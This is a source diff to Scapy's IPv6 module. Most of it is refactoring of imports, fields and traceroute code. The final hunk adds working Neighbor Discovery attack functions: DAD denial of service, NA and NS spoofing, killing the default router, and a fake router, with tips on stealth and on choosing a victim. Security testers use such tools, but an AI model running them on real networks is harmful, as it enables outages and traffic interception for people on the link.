@@ -24,7 +24,9 @@ IPv6 (Internet Protocol v6).
 """
 
 
+import random
 import socket
+import sys
 if not socket.has_ipv6:
     raise socket.error("can't use AF_INET6, IPv6 is disabled")
 if not hasattr(socket, "IPPROTO_IPV6"):
@@ -35,8 +37,8 @@ if not hasattr(socket, "IPPROTO_IPIP"):
     socket.IPPROTO_IPIP = 4
 
 from scapy.config import conf
-from scapy.layers.l2 import *
-from scapy.layers.inet import *
+from scapy.base_classes import *
+from scapy.data import *
 from scapy.fields import *
 from scapy.packet import *
 from scapy.volatile import *
@@ -45,6 +47,13 @@ from scapy.as_resolvers import AS_resolver_riswhois
 from scapy.supersocket import SuperSocket,L3RawSocket
 from scapy.arch import *
 from scapy.utils6 import *
+from scapy.layers.l2 import *
+from scapy.layers.inet import *
+from scapy.utils import inet_pton, inet_ntop, strxor
+from scapy.error import warning
+if conf.route6 is None:
+    # unused import, only to initialize conf.route6
+    import scapy.route6
 
 
 #############################################################################
@@ -177,7 +186,7 @@ class Net6(Gen): # syntax ex. fec0::/126
         return iter(rec(0, ['']))
 
     def __repr__(self):
-        return "<Net6 %s>" % self.repr
+        return "Net6(%r)" % self.repr
 
 
 
@@ -245,6 +254,20 @@ class SourceIP6Field(IP6Field):
                     return None
             else:
                 iff,x,nh = conf.route6.route(dst)
+        return IP6Field.i2h(self, pkt, x)
+
+class DestIP6Field(IP6Field, DestField):
+    bindings = {}
+    def __init__(self, name, default):
+        IP6Field.__init__(self, name, None)
+        DestField.__init__(self, name, default)
+    def i2m(self, pkt, x):
+        if x is None:
+            x = self.dst_from_pkt(pkt)
+        return IP6Field.i2m(self, pkt, x)
+    def i2h(self, pkt, x):
+        if x is None:
+            x = self.dst_from_pkt(pkt)
         return IP6Field.i2h(self, pkt, x)
 
 ipv6nh = { 0:"Hop-by-Hop Option Header",
@@ -358,7 +381,7 @@ class IPv6(_IPv6GuessPayload, Packet, IPTools):
                     ByteEnumField("nh", 59, ipv6nh),
                     ByteField("hlim", 64),
                     SourceIP6Field("src", "dst"), # dst is for src @ selection
-                    IP6Field("dst", "::1") ]
+                    DestIP6Field("dst", "::1") ]
 
     def route(self):
         dst = self.dst
@@ -422,10 +445,10 @@ class IPv6(_IPv6GuessPayload, Packet, IPTools):
                 nh = self.payload.nh # XXX what if another extension follows ?
                 ss = foundhao.hoa
 
-        if conf.checkIPsrc and conf.checkIPaddr:
+        if conf.checkIPsrc and conf.checkIPaddr and not in6_ismaddr(sd):
             sd = inet_pton(socket.AF_INET6, sd)
             ss = inet_pton(socket.AF_INET6, self.src)
-            return struct.pack("B",nh)+self.payload.hashret()
+            return strxor(sd, ss) + struct.pack("B", nh) + self.payload.hashret()
         else:
             return struct.pack("B", nh)+self.payload.hashret()
 
@@ -476,7 +499,9 @@ class IPv6(_IPv6GuessPayload, Packet, IPTools):
             return self.payload.answers(other.payload)
 
 
-conf.neighbor.register_l3(Ether, IPv6, lambda l2,l3: getmacbyip6(l3.dst))
+def inet6_register_l3(l2, l3):
+    return getmacbyip6(l3.dst)
+conf.neighbor.register_l3(Ether, IPv6, inet6_register_l3)
 
 
 class IPerror6(IPv6):
@@ -705,13 +730,18 @@ class PadN(Packet): # IPv6 Hop-By-Hop Option
 class RouterAlert(Packet): # RFC 2711 - IPv6 Hop-By-Hop Option
     name = "Router Alert"
     fields_desc = [_OTypeField("otype", 0x05, _hbhopts),
-                   ByteField("optlen", 2), 
-                   ShortEnumField("value", None, 
-                                  { 0: "Datagram contains a MLD message", 
+                   ByteField("optlen", 2),
+                   ShortEnumField("value", None,
+                                  { 0: "Datagram contains a MLD message",
                                     1: "Datagram contains RSVP message",
-                                    2: "Datagram contains an Active Network message" }) ]
+                                    2: "Datagram contains an Active Network message",
+                                   68: "NSIS NATFW NSLP",
+                                   69: "MPLS OAM",
+                                65535: "Reserved" })]
     # TODO : Check IANA has not defined new values for value field of RouterAlertOption
-    # TODO : now that we have that option, we should do something in MLD class that need it
+    # TODO : Now that we have that option, we should do something in MLD class that need it
+    # TODO : IANA has defined ranges of values which can't be easily represented here.
+    #        iana.org/assignments/ipv6-routeralert-values/ipv6-routeralert-values.xhtml
     def alignment_delta(self, curpos): # alignment requirement : 2n+0
         x = 2 ; y = 0
         delta = x*((curpos - y + x - 1)/x) + y - curpos 
@@ -1317,8 +1347,8 @@ class _ICMPv6ML(_ICMPv6):
 class ICMPv6MLQuery(_ICMPv6ML): # RFC 2710
     name = "MLD - Multicast Listener Query"
     type   = 130
-    mrd    = 10000
-    mladdr = "::" # 10s for mrd
+    mrd    = 10000 # 10s for mrd
+    mladdr = "::"
     overload_fields = {IPv6: { "dst": "ff02::1", "hlim": 1, "nh": 58 }} 
     def hashret(self):
         if self.mladdr != "::":
@@ -1630,7 +1660,7 @@ class ICMPv6NDOptMAP(_ICMPv6NDGuessPayload, Packet):     # RFC 4140
                     IP6Field("addr", "::") ] 
 
 
-class IP6PrefixField(IP6Field):
+class _IP6PrefixField(IP6Field):
     __slots__ = ["length_from"]
     def __init__(self, name, default):
         IP6Field.__init__(self, name, default)
@@ -1677,7 +1707,7 @@ class ICMPv6NDOptRouteInfo(_ICMPv6NDGuessPayload, Packet): # RFC 4191
                     BitField("prf",0,2),
                     BitField("res2",0,3),
                     IntField("rtlifetime", 0xffffffff),
-                    IP6PrefixField("prefix", None) ]
+                    _IP6PrefixField("prefix", None) ]
   
 class ICMPv6NDOptRDNSS(_ICMPv6NDGuessPayload, Packet): # RFC 5006
     name = "ICMPv6 Neighbor Discovery Option - Recursive DNS Server Option"
@@ -1695,7 +1725,57 @@ class ICMPv6NDOptEFA(_ICMPv6NDGuessPayload, Packet): # RFC 5175 (prev. 5075)
                     ByteField("len", 1),
                     BitField("res", 0, 48) ]
 
-from scapy.layers.dhcp6 import DomainNameListField
+# As required in Sect 8. of RFC 3315, Domain Names must be encoded as
+# described in section 3.1 of RFC 1035
+# XXX Label should be at most 63 octets in length : we do not enforce it
+#     Total length of domain should be 255 : we do not enforce it either
+class DomainNameListField(StrLenField):
+    __slots__ = ["padded"]
+    islist = 1
+    padded_unit = 8
+
+    def __init__(self, name, default, fld=None, length_from=None, padded=False):
+        self.padded = padded
+        StrLenField.__init__(self, name, default, fld, length_from)
+
+    def i2len(self, pkt, x):
+        return len(self.i2m(pkt, x))
+
+    def m2i(self, pkt, x):
+        res = []
+        while x:
+            # Get a name until \x00 is reached
+            cur = []
+            while x and x[0] != '\x00':
+                l = ord(x[0])
+                cur.append(x[1:l+1])
+                x = x[l+1:]
+            if self.padded:
+              # Discard following \x00 in padded mode
+              if len(cur):
+                res.append(".".join(cur) + ".")
+            else:
+              # Store the current name
+              res.append(".".join(cur) + ".")
+            if x and x[0] == '\x00':
+                x = x[1:]
+        return res
+
+    def i2m(self, pkt, x):
+        def conditionalTrailingDot(z):
+            if z and z[-1] == '\x00':
+                return z
+            return z+'\x00'
+        # Build the encode names
+        tmp = map(lambda y: map((lambda z: chr(len(z))+z), y.split('.')), x)
+        ret_string  = "".join(map(lambda x: conditionalTrailingDot("".join(x)), tmp))
+
+        # In padded mode, add some \x00 bytes
+        if self.padded and not len(ret_string) % self.padded_unit == 0:
+            ret_string += "\x00" * (self.padded_unit - len(ret_string) % self.padded_unit)
+
+        return ret_string
+
 class ICMPv6NDOptDNSSL(_ICMPv6NDGuessPayload, Packet): # RFC 6106
     name = "ICMPv6 Neighbor Discovery Option - DNS Search List Option"
     fields_desc = [ ByteField("type", 31),
@@ -2914,14 +2994,14 @@ class TracerouteResult6(TracerouteResult):
 
             trace[d][s[IPv6].hlim] = r[IPv6].src, t
 
-        for k in trace.values():
-            m = filter(lambda x: k[x][1], k.keys())
-            if not m:
+        for k in trace.itervalues():
+            try:
+                m = min(x for x, y in k.itervalues() if y[1])
+            except ValueError:
                 continue
-            m = min(m)
-            for l in k.keys():
+            for l in k.keys():  # use .keys(): k is modified in the loop
                 if l > m:
-                    del(k[l])
+                    del k[l]
 
         return trace
 
@@ -3006,6 +3086,629 @@ class _IPv6inIP(SuperSocket):
 
   def send(self, x):
     return self.worker.send(IP(dst=self.dst, src=self.src, proto=socket.IPPROTO_IPV6)/x)
+
+
+#############################################################################
+#############################################################################
+###                  Neighbor Discovery Protocol Attacks                  ###
+#############################################################################
+#############################################################################
+
+def _NDP_Attack_DAD_DoS(reply_callback, iface=None, mac_src_filter=None,
+                        tgt_filter=None, reply_mac=None):
+    """
+    Internal generic helper accepting a specific callback as first argument,
+    for NS or NA reply. See the two specific functions below.
+    """
+
+    def is_request(req, mac_src_filter, tgt_filter):
+        """
+        Check if packet req is a request
+        """
+
+        # Those simple checks are based on Section 5.4.2 of RFC 4862
+        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):
+            return 0
+
+        # Get and compare the MAC address
+        mac_src = req[Ether].src
+        if mac_src_filter and mac_src != mac_src_filter:
+            return 0
+
+        # Source must be the unspecified address
+        if req[IPv6].src != "::":
+            return 0
+
+        # Check destination is the link-local solicited-node multicast
+        # address associated with target address in received NS
+        tgt = socket.inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)
+        if tgt_filter and tgt != tgt_filter:
+            return 0
+        received_snma = socket.inet_pton(socket.AF_INET6, req[IPv6].dst)
+        expected_snma = in6_getnsma(tgt)
+        if received_snma != expected_snma:
+            return 0
+
+        return 1
+
+    if not iface:
+        iface = conf.iface
+
+    # To prevent sniffing our own traffic
+    if not reply_mac:
+        reply_mac = get_if_hwaddr(iface)
+    sniff_filter = "icmp6 and not ether src %s" % reply_mac
+
+    sniff(store=0,
+          filter=sniff_filter,
+          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),
+          prn=lambda x: reply_callback(x, reply_mac, iface),
+          iface=iface)
+
+
+def NDP_Attack_DAD_DoS_via_NS(iface=None, mac_src_filter=None, tgt_filter=None,
+                              reply_mac=None):
+    """
+    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC
+    3756. This is done by listening incoming NS messages sent from the
+    unspecified address and sending a NS reply for the target address,
+    leading the peer to believe that another node is also performing DAD
+    for that address.
+
+    By default, the fake NS sent to create the DoS uses:
+     - as target address the target address found in received NS.
+     - as IPv6 source address: the unspecified address (::).
+     - as IPv6 destination address: the link-local solicited-node multicast
+       address derived from the target address in received NS.
+     - the mac address of the interface as source (or reply_mac, see below).
+     - the multicast mac address derived from the solicited node multicast
+       address used as IPv6 destination address.
+
+    Following arguments can be used to change the behavior:
+
+    iface: a specific interface (e.g. "eth0") of the system on which the
+         DoS should be launched. If None is provided conf.iface is used.
+
+    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
+         Only NS messages received from this source will trigger replies.
+         This allows limiting the effects of the DoS to a single target by
+         filtering on its mac address. The default value is None: the DoS
+         is not limited to a specific mac address.
+
+    tgt_filter: Same as previous but for a specific target IPv6 address for
+         received NS. If the target address in the NS message (not the IPv6
+         destination address) matches that address, then a fake reply will
+         be sent, i.e. the emitter will be a target of the DoS.
+
+    reply_mac: allow specifying a specific source mac address for the reply,
+         i.e. to prevent the use of the mac address of the interface.
+    """
+
+    def ns_reply_callback(req, reply_mac, iface):
+        """
+        Callback that reply to a NS by sending a similar NS
+        """
+
+        # Let's build a reply and send it
+        mac = req[Ether].src
+        dst = req[IPv6].dst
+        tgt = req[ICMPv6ND_NS].tgt
+        rep = Ether(src=reply_mac)/IPv6(src="::", dst=dst)/ICMPv6ND_NS(tgt=tgt)
+        sendp(rep, iface=iface, verbose=0)
+
+        print "Reply NS for target address %s (received from %s)" % (tgt, mac)
+
+    _NDP_Attack_DAD_DoS(ns_reply_callback, iface, mac_src_filter,
+                        tgt_filter, reply_mac)
+
+
+def NDP_Attack_DAD_DoS_via_NA(iface=None, mac_src_filter=None, tgt_filter=None,
+                              reply_mac=None):
+    """
+    Perform the DAD DoS attack using NS described in section 4.1.3 of RFC
+    3756. This is done by listening incoming NS messages *sent from the
+    unspecified address* and sending a NA reply for the target address,
+    leading the peer to believe that another node is also performing DAD
+    for that address.
+
+    By default, the fake NA sent to create the DoS uses:
+     - as target address the target address found in received NS.
+     - as IPv6 source address: the target address found in received NS.
+     - as IPv6 destination address: the link-local solicited-node multicast
+       address derived from the target address in received NS.
+     - the mac address of the interface as source (or reply_mac, see below).
+     - the multicast mac address derived from the solicited node multicast
+       address used as IPv6 destination address.
+     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr) filled
+       with the mac address used as source of the NA.
+
+    Following arguments can be used to change the behavior:
+
+    iface: a specific interface (e.g. "eth0") of the system on which the
+          DoS should be launched. If None is provided conf.iface is used.
+
+    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
+         Only NS messages received from this source will trigger replies.
+         This allows limiting the effects of the DoS to a single target by
+         filtering on its mac address. The default value is None: the DoS
+         is not limited to a specific mac address.
+
+    tgt_filter: Same as previous but for a specific target IPv6 address for
+         received NS. If the target address in the NS message (not the IPv6
+         destination address) matches that address, then a fake reply will
+         be sent, i.e. the emitter will be a target of the DoS.
+
+    reply_mac: allow specifying a specific source mac address for the reply,
+         i.e. to prevent the use of the mac address of the interface. This
+         address will also be used in the Target Link-Layer Address option.
+    """
+
+    def na_reply_callback(req, reply_mac, iface):
+        """
+        Callback that reply to a NS with a NA
+        """
+
+        # Let's build a reply and send it
+        mac = req[Ether].src
+        dst = req[IPv6].dst
+        tgt = req[ICMPv6ND_NS].tgt
+        rep = Ether(src=reply_mac)/IPv6(src=tgt, dst=dst)
+        rep /= ICMPv6ND_NA(tgt=tgt, S=0, R=0, O=1)
+        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)
+        sendp(rep, iface=iface, verbose=0)
+
+        print "Reply NA for target address %s (received from %s)" % (tgt, mac)
+
+    _NDP_Attack_DAD_DoS(na_reply_callback, iface, mac_src_filter,
+                        tgt_filter, reply_mac)
+
+
+def NDP_Attack_NA_Spoofing(iface=None, mac_src_filter=None, tgt_filter=None,
+                           reply_mac=None, router=False):
+    """
+    The main purpose of this function is to send fake Neighbor Advertisement
+    messages to a victim. As the emission of unsolicited Neighbor Advertisement
+    is pretty pointless (from an attacker standpoint) because it will not
+    lead to a modification of a victim's neighbor cache, the function send
+    advertisements in response to received NS (NS sent as part of the DAD,
+    i.e. with an unspecified address as source, are not considered).
+
+    By default, the fake NA sent to create the DoS uses:
+     - as target address the target address found in received NS.
+     - as IPv6 source address: the target address
+     - as IPv6 destination address: the source IPv6 address of received NS
+       message.
+     - the mac address of the interface as source (or reply_mac, see below).
+     - the source mac address of the received NS as destination macs address
+       of the emitted NA.
+     - A Target Link-Layer address option (ICMPv6NDOptDstLLAddr)
+       filled with the mac address used as source of the NA.
+
+    Following arguments can be used to change the behavior:
+
+    iface: a specific interface (e.g. "eth0") of the system on which the
+          DoS should be launched. If None is provided conf.iface is used.
+
+    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
+         Only NS messages received from this source will trigger replies.
+         This allows limiting the effects of the DoS to a single target by
+         filtering on its mac address. The default value is None: the DoS
+         is not limited to a specific mac address.
+
+    tgt_filter: Same as previous but for a specific target IPv6 address for
+         received NS. If the target address in the NS message (not the IPv6
+         destination address) matches that address, then a fake reply will
+         be sent, i.e. the emitter will be a target of the DoS.
+
+    reply_mac: allow specifying a specific source mac address for the reply,
+         i.e. to prevent the use of the mac address of the interface. This
+         address will also be used in the Target Link-Layer Address option.
+
+    router: by the default (False) the 'R' flag in the NA used for the reply
+         is not set. If the parameter is set to True, the 'R' flag in the
+         NA is set, advertising us as a router.
+
+    Please, keep the following in mind when using the function: for obvious
+    reasons (kernel space vs. Python speed), when the target of the address
+    resolution is on the link, the sender of the NS receives 2 NA messages
+    in a row, the valid one and our fake one. The second one will overwrite
+    the information provided by the first one, i.e. the natural latency of
+    Scapy helps here.
+
+    In practice, on a common Ethernet link, the emission of the NA from the
+    genuine target (kernel stack) usually occurs in the same millisecond as
+    the receipt of the NS. The NA generated by Scapy6 will usually come after
+    something 20+ ms. On a usual testbed for instance, this difference is
+    sufficient to have the first data packet sent from the victim to the
+    destination before it even receives our fake NA.
+    """
+
+    def is_request(req, mac_src_filter, tgt_filter):
+        """
+        Check if packet req is a request
+        """
+
+        # Those simple checks are based on Section 5.4.2 of RFC 4862
+        if not (Ether in req and IPv6 in req and ICMPv6ND_NS in req):
+            return 0
+
+        mac_src = req[Ether].src
+        if mac_src_filter and mac_src != mac_src_filter:
+            return 0
+
+        # Source must NOT be the unspecified address
+        if req[IPv6].src == "::":
+            return 0
+
+        tgt = socket.inet_pton(socket.AF_INET6, req[ICMPv6ND_NS].tgt)
+        if tgt_filter and tgt != tgt_filter:
+            return 0
+
+        dst = req[IPv6].dst
+        if in6_isllsnmaddr(dst): # Address is Link Layer Solicited Node mcast.
+
+            # If this is a real address resolution NS, then the destination
+            # address of the packet is the link-local solicited node multicast
+            # address associated with the target of the NS.
+            # Otherwise, the NS is a NUD related one, i.e. the peer is
+            # unicasting the NS to check the target is still alive (L2
+            # information is still in its cache and it is verified)
+            received_snma = socket.inet_pton(socket.AF_INET6, dst)
+            expected_snma = in6_getnsma(tgt)
+            if received_snma != expected_snma:
+                print "solicited node multicast @ does not match target @!"
+                return 0
+
+        return 1
+
+    def reply_callback(req, reply_mac, router, iface):
+        """
+        Callback that reply to a NS with a spoofed NA
+        """
+
+        # Let's build a reply (as defined in Section 7.2.4. of RFC 4861) and
+        # send it back.
+        mac = req[Ether].src
+        pkt = req[IPv6]
+        src = pkt.src
+        tgt = req[ICMPv6ND_NS].tgt
+        rep = Ether(src=reply_mac, dst=mac)/IPv6(src=tgt, dst=src)
+        rep /= ICMPv6ND_NA(tgt=tgt, S=1, R=router, O=1) # target from the NS
+
+        # "If the solicitation IP Destination Address is not a multicast
+        # address, the Target Link-Layer Address option MAY be omitted"
+        # Given our purpose, we always include it.
+        rep /= ICMPv6NDOptDstLLAddr(lladdr=reply_mac)
+
+        sendp(rep, iface=iface, verbose=0)
+
+        print "Reply NA for target address %s (received from %s)" % (tgt, mac)
+
+    if not iface:
+        iface = conf.iface
+    # To prevent sniffing our own traffic
+    if not reply_mac:
+        reply_mac = get_if_hwaddr(iface)
+    sniff_filter = "icmp6 and not ether src %s" % reply_mac
+
+    router = (router and 1) or 0 # Value of the R flags in NA
+
+    sniff(store=0,
+          filter=sniff_filter,
+          lfilter=lambda x: is_request(x, mac_src_filter, tgt_filter),
+          prn=lambda x: reply_callback(x, reply_mac, router, iface),
+          iface=iface)
+
+
+def NDP_Attack_NS_Spoofing(src_lladdr=None, src=None, target="2001:db8::1",
+                           dst=None, src_mac=None, dst_mac=None, loop=True,
+                           inter=1, iface=None):
+    """
+    The main purpose of this function is to send fake Neighbor Solicitations
+    messages to a victim, in order to either create a new entry in its neighbor
+    cache or update an existing one. In section 7.2.3 of RFC 4861, it is stated
+    that a node SHOULD create the entry or update an existing one (if it is not
+    currently performing DAD for the target of the NS). The entry's reachability
+    state is set to STALE.
+
+    The two main parameters of the function are the source link-layer address
+    (carried by the Source Link-Layer Address option in the NS) and the
+    source address of the packet.
+
+    Unlike some other NDP_Attack_* function, this one is not based on a
+    stimulus/response model. When called, it sends the same NS packet in loop
+    every second (the default)
+
+    Following arguments can be used to change the format of the packets:
+
+    src_lladdr: the MAC address used in the Source Link-Layer Address option
+         included in the NS packet. This is the address that the peer should
+         associate in its neighbor cache with the IPv6 source address of the
+         packet. If None is provided, the mac address of the interface is
+         used.
+
+    src: the IPv6 address used as source of the packet. If None is provided,
+         an address associated with the emitting interface will be used
+         (based on the destination address of the packet).
+
+    target: the target address of the NS packet. If no value is provided,
+         a dummy address (2001:db8::1) is used. The value of the target
+         has a direct impact on the destination address of the packet if it
+         is not overridden. By default, the solicited-node multicast address
+         associated with the target is used as destination address of the
+         packet. Consider specifying a specific destination address if you
+         intend to use a target address different than the one of the victim.
+
+    dst: The destination address of the NS. By default, the solicited node
+         multicast address associated with the target address (see previous
+         parameter) is used if no specific value is provided. The victim
+         is not expected to check the destination address of the packet,
+         so using a multicast address like ff02::1 should work if you want
+         the attack to target all hosts on the link. On the contrary, if
+         you want to be more stealth, you should provide the target address
+         for this parameter in order for the packet to be sent only to the
+         victim.
+
+    src_mac: the MAC address used as source of the packet. By default, this
+         is the address of the interface. If you want to be more stealth,
+         feel free to use something else. Note that this address is not the
+         that the victim will use to populate its neighbor cache.
+
+    dst_mac: The MAC address used as destination address of the packet. If
+         the IPv6 destination address is multicast (all-nodes, solicited
+         node, ...), it will be computed. If the destination address is
+         unicast, a neighbor solicitation will be performed to get the
+         associated address. If you want the attack to be stealth, you
+         can provide the MAC address using this parameter.
+
+    loop: By default, this parameter is True, indicating that NS packets
+         will be sent in loop, separated by 'inter' seconds (see below).
+         When set to False, a single packet is sent.
+
+    inter: When loop parameter is True (the default), this parameter provides
+         the interval in seconds used for sending NS packets.
+
+    iface: to force the sending interface.
+    """
+
+    if not iface:
+        iface = conf.iface
+
+    # Use provided MAC address as source link-layer address option
+    # or the MAC address of the interface if none is provided.
+    if not src_lladdr:
+        src_lladdr = get_if_hwaddr(iface)
+
+    # Prepare packets parameters
+    ether_params = {}
+    if src_mac:
+        ether_params["src"] = src_mac
+
+    if dst_mac:
+        ether_params["dst"] = dst_mac
+
+    ipv6_params = {}
+    if src:
+        ipv6_params["src"] = src
+    if dst:
+        ipv6_params["dst"] = dst
+    else:
+        # Compute the solicited-node multicast address
+        # associated with the target address.
+        tmp = inet_ntop(socket.AF_INET6,
+                        in6_getnsma(inet_pton(socket.AF_INET6, target)))
+        ipv6_params["dst"] = tmp
+
+    pkt = Ether(**ether_params)
+    pkt /= IPv6(**ipv6_params)
+    pkt /= ICMPv6ND_NS(tgt=target)
+    pkt /= ICMPv6NDOptSrcLLAddr(lladdr=src_lladdr)
+
+    sendp(pkt, inter=inter, loop=loop, iface=iface, verbose=0)
+
+
+def NDP_Attack_Kill_Default_Router(iface=None, mac_src_filter=None,
+                                   ip_src_filter=None, reply_mac=None,
+                                   tgt_mac=None):
+    """
+    The purpose of the function is to monitor incoming RA messages
+    sent by default routers (RA with a non-zero Router Lifetime values)
+    and invalidate them by immediately replying with fake RA messages
+    advertising a zero Router Lifetime value.
+
+    The result on receivers is that the router is immediately invalidated,
+    i.e. the associated entry is discarded from the default router list
+    and destination cache is updated to reflect the change.
+
+    By default, the function considers all RA messages with a non-zero
+    Router Lifetime value but provides configuration knobs to allow
+    filtering RA sent by specific routers (Ethernet source address).
+    With regard to emission, the multicast all-nodes address is used
+    by default but a specific target can be used, in order for the DoS to
+    apply only to a specific host.
+
+    More precisely, following arguments can be used to change the behavior:
+
+    iface: a specific interface (e.g. "eth0") of the system on which the
+         DoS should be launched. If None is provided conf.iface is used.
+
+    mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
+         Only RA messages received from this source will trigger replies.
+         If other default routers advertised their presence on the link,
+         their clients will not be impacted by the attack. The default
+         value is None: the DoS is not limited to a specific mac address.
+
+    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter
+         on. Only RA messages received from this source address will trigger
+         replies. If other default routers advertised their presence on the
+         link, their clients will not be impacted by the attack. The default
+         value is None: the DoS is not limited to a specific IPv6 source
+         address.
+
+    reply_mac: allow specifying a specific source mac address for the reply,
+         i.e. to prevent the use of the mac address of the interface.
+
+    tgt_mac: allow limiting the effect of the DoS to a specific host,
+         by sending the "invalidating RA" only to its mac address.
+    """
+
+    def is_request(req, mac_src_filter, ip_src_filter):
+        """
+        Check if packet req is a request
+        """
+
+        if not (Ether in req and IPv6 in req and ICMPv6ND_RA in req):
+            return 0
+
+        mac_src = req[Ether].src
+        if mac_src_filter and mac_src != mac_src_filter:
+            return 0
+
+        ip_src = req[IPv6].src
+        if ip_src_filter and ip_src != ip_src_filter:
+            return 0
+
+        # Check if this is an advertisement for a Default Router
+        # by looking at Router Lifetime value
+        if req[ICMPv6ND_RA].routerlifetime == 0:
+            return 0
+
+        return 1
+
+    def ra_reply_callback(req, reply_mac, tgt_mac, iface):
+        """
+        Callback that sends an RA with a 0 lifetime
+        """
+
+        # Let's build a reply and send it
+
+        src = req[IPv6].src
+
+        # Prepare packets parameters
+        ether_params = {}
+        if reply_mac:
+            ether_params["src"] = reply_mac
+
+        if tgt_mac:
+            ether_params["dst"] = tgt_mac
+
+        # Basis of fake RA (high pref, zero lifetime)
+        rep = Ether(**ether_params)/IPv6(src=src, dst="ff02::1")
+        rep /= ICMPv6ND_RA(prf=1, routerlifetime=0)
+
+        # Add it a PIO from the request ...
+        tmp = req
+        while ICMPv6NDOptPrefixInfo in tmp:
+            pio = tmp[ICMPv6NDOptPrefixInfo]
+            tmp = pio.payload
+            del(pio.payload)
+            rep /= pio
+
+        # ... and source link layer address option
+        if ICMPv6NDOptSrcLLAddr in req:
+            mac = req[ICMPv6NDOptSrcLLAddr].lladdr
+        else:
+            mac = req[Ether].src
+        rep /= ICMPv6NDOptSrcLLAddr(lladdr=mac)
+
+        sendp(rep, iface=iface, verbose=0)
+
+        print "Fake RA sent with source address %s" % src
+
+
+    if not iface:
+        iface = conf.iface
+    # To prevent sniffing our own traffic
+    if not reply_mac:
+        reply_mac = get_if_hwaddr(iface)
+    sniff_filter = "icmp6 and not ether src %s" % reply_mac
+
+    sniff(store=0,
+          filter=sniff_filter,
+          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),
+          prn=lambda x: ra_reply_callback(x, reply_mac, tgt_mac, iface),
+          iface=iface)
+
+
+def NDP_Attack_Fake_Router(ra, iface=None, mac_src_filter=None,
+                           ip_src_filter=None):
+    """
+    The purpose of this function is to send provided RA message at layer 2
+    (i.e. providing a packet starting with IPv6 will not work) in response
+    to received RS messages. In the end, the function is a simple wrapper
+    around sendp() that monitor the link for RS messages.
+
+    It is probably better explained with an example:
+
+      >>> ra  = Ether()/IPv6()/ICMPv6ND_RA()
+      >>> ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64)
+      >>> ra /= ICMPv6NDOptPrefixInfo(prefix="2001:db8:2::", prefixlen=64)
+      >>> ra /= ICMPv6NDOptSrcLLAddr(lladdr="00:11:22:33:44:55")
+      >>> NDP_Attack_Fake_Router(ra, iface="eth0")
+      Fake RA sent in response to RS from fe80::213:58ff:fe8c:b573
+      Fake RA sent in response to RS from fe80::213:72ff:fe8c:b9ae
+      ...
+
+    Following arguments can be used to change the behavior:
+
+      ra: the RA message to send in response to received RS message.
+
+      iface: a specific interface (e.g. "eth0") of the system on which the
+             DoS should be launched. If none is provided, conf.iface is
+             used.
+
+      mac_src_filter: a mac address (e.g "00:13:72:8c:b5:69") to filter on.
+         Only RS messages received from this source will trigger a reply.
+         Note that no changes to provided RA is done which imply that if
+         you intend to target only the source of the RS using this option,
+         you will have to set the Ethernet destination address to the same
+         value in your RA.
+         The default value for this parameter is None: no filtering on the
+         source of RS is done.
+
+    ip_src_filter: an IPv6 address (e.g. fe80::21e:bff:fe4e:3b2) to filter
+         on. Only RS messages received from this source address will trigger
+         replies. Same comment as for previous argument apply: if you use
+         the option, you will probably want to set a specific Ethernet
+         destination address in the RA.
+    """
+
+    def is_request(req, mac_src_filter, ip_src_filter):
+        """
+        Check if packet req is a request
+        """
+
+        if not (Ether in req and IPv6 in req and ICMPv6ND_RS in req):
+            return 0
+
+        mac_src = req[Ether].src
+        if mac_src_filter and mac_src != mac_src_filter:
+            return 0
+
+        ip_src = req[IPv6].src
+        if ip_src_filter and ip_src != ip_src_filter:
+            return 0
+
+        return 1
+
+    def ra_reply_callback(req, iface):
+        """
+        Callback that sends an RA in reply to an RS
+        """
+
+        src = req[IPv6].src
+        sendp(ra, iface=iface, verbose=0)
+        print "Fake RA sent in response to RS from %s" % src
+
+    if not iface:
+        iface = conf.iface
+    sniff_filter = "icmp6"
+
+    sniff(store=0,
+          filter=sniff_filter,
+          lfilter=lambda x: is_request(x, mac_src_filter, ip_src_filter),
+          prn=lambda x: ra_reply_callback(x, iface),
+          iface=iface)
 
 
 #############################################################################
